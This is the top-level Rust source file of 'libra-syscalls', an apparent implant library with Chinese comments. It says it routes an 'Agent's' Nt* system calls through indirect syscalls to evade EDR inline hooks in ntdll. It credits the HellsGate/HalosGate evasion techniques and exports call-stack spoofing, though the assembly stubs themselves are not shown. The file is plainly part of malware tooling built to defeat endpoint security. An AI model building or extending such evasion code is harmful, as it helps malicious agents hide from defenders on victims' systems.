//! `libra-syscalls` —— 间接 syscall 地基。
//!
//! 目标（Phase 1）：让 Agent 的 `Nt*` 调用不再经由被 EDR inline hook 的
//! ntdll 导出函数头，而是解析出 SSN 与 `syscall` 指令地址后，从我们自己的
//! 汇编桥直接跳转执行。
//!
//! 用法：
//! ```ignore
//! libra_syscalls::init()?;            // 启动时一次
//! let status = unsafe { libra_syscalls::nt_delay_execution(0, &mut delay) };
//! ```
//!
//! 参考了 HellsGate / HalosGate 的免杀思路，但实现为 Rust 表驱动 + 专用
//! 汇编桥 + 全局 SSN 槽，命名、字节布局与扫描策略均独立设计。

pub mod types;

#[cfg(windows)]
mod ffi;
#[cfg(windows)]
mod pe;
#[cfg(windows)]
mod extract;
#[cfg(windows)]
mod table;
#[cfg(windows)]
mod stub;
#[cfg(windows)]
mod invoke;
#[cfg(windows)]
mod spoof;

#[cfg(windows)]
pub use extract::{probe_stub, StubProbe};
#[cfg(windows)]
pub use invoke::*;
#[cfg(windows)]
pub use spoof::{init_spoof, spoof_call, SpoofFrame};
#[cfg(windows)]
pub use table::SyscallTable;
pub use types::*;

/// 初始化间接 syscall 表：枚举 ntdll 导出、提取 40 个 SSN 与全局 trampoline。
///
/// 幂等；重复调用会重新解析（开销极小）。失败返回描述性错误。
#[cfg(windows)]
pub fn init() -> Result<(), &'static str> {
    let table = SyscallTable::build()?;
    if table.trampoline == 0 {
        return Err("no syscall trampoline found");
    }
    stub::write_ssn(&table)?;
    stub::LIBRA_TRAMPOLINE.store(
        table.trampoline as u64,
        core::sync::atomic::Ordering::Relaxed,
    );
    // spoof 是增强能力：gadget 找不到时不阻断 syscall 地基，仅使 spoof_call 不可用。
    let _ = spoof::init_spoof();
    Ok(())
}

/// 非 Windows 平台没有 ntdll syscall，提供空实现以保持 workspace 可交叉编译。
#[cfg(not(windows))]
pub fn init() -> Result<(), &'static str> {
    Ok(())
}
